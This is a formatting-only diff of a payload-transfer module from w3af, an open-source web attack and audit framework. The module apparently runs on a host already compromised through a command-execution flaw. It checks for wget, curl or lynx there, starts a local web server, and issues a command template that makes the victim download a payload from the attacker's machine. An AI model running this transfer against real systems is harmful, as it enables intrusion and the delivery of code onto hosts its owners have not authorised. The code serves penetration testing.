@@ -19,6 +19,7 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
+
 import os
 
 import w3af.core.controllers.daemons.webserver as webserver
@@ -26,7 +27,9 @@ import w3af.core.data.kb.config as cf
 
 from w3af.core.controllers.misc.temp_dir import get_temp_dir
 from w3af.core.controllers.intrusion_tools.execMethodHelpers import get_remote_temp_file
-from w3af.core.controllers.payload_transfer.base_payload_transfer import BasePayloadTransfer
+from w3af.core.controllers.payload_transfer.base_payload_transfer import (
+    BasePayloadTransfer,
+)
 from w3af.core.data.fuzzer.utils import rand_alpha
 
 
@@ -54,16 +57,17 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
         arrived as expected to the other end.
         """
         #    Here i test what remote command we can use to fetch the payload
-        for fetcher in ['wget', 'curl', 'lynx']:
-            res = self._exec_method('which ' + fetcher)
-            if res.startswith('/'):
+        for fetcher in ["wget", "curl", "lynx"]:
+            res = self._exec_method("which " + fetcher)
+            if res.startswith("/"):
                 #    Almost there...
                 self._command = fetcher
 
                 try:
                     # Lets test if the transfer method works.
-                    return self.transfer('test_string\n',
-                                         get_remote_temp_file(self._exec_method))
+                    return self.transfer(
+                        "test_string\n", get_remote_temp_file(self._exec_method)
+                    )
                 except:
                     continue
 
@@ -83,26 +87,31 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
         if not self._command:
             self.can_transfer()
 
-        cmd_templates = {'wget': 'wget http://%s:%s/%s -O %s',
-                         'lynx': 'lynx -source http://%s:%s/%s > %s',
-                         'curl': 'curl http://%s:%s/%s > %s'}
+        cmd_templates = {
+            "wget": "wget http://%s:%s/%s -O %s",
+            "lynx": "lynx -source http://%s:%s/%s > %s",
+            "curl": "curl http://%s:%s/%s > %s",
+        }
 
         # Create the file
         filename = rand_alpha(10)
         file_path = get_temp_dir() + os.path.sep + filename
-        f = open(file_path, 'w')
+        f = open(file_path, "w")
         f.write(data_str)
         f.close()
 
         # Start a web server on the inbound port and create the file that
         # will be fetched by the compromised host
-        webserver.start_webserver(cf.cf.get('local_ip_address'),
-                                  self._inbound_port,
-                                  get_temp_dir())
+        webserver.start_webserver(
+            cf.cf.get("local_ip_address"), self._inbound_port, get_temp_dir()
+        )
 
-        cmd_to_run = cmd_templates[self._command] % \
-            (cf.cf.get('local_ip_address'), self._inbound_port,
-             filename, destination)
+        cmd_to_run = cmd_templates[self._command] % (
+            cf.cf.get("local_ip_address"),
+            self._inbound_port,
+            filename,
+            destination,
+        )
         self._exec_method(cmd_to_run)
 
         os.remove(file_path)
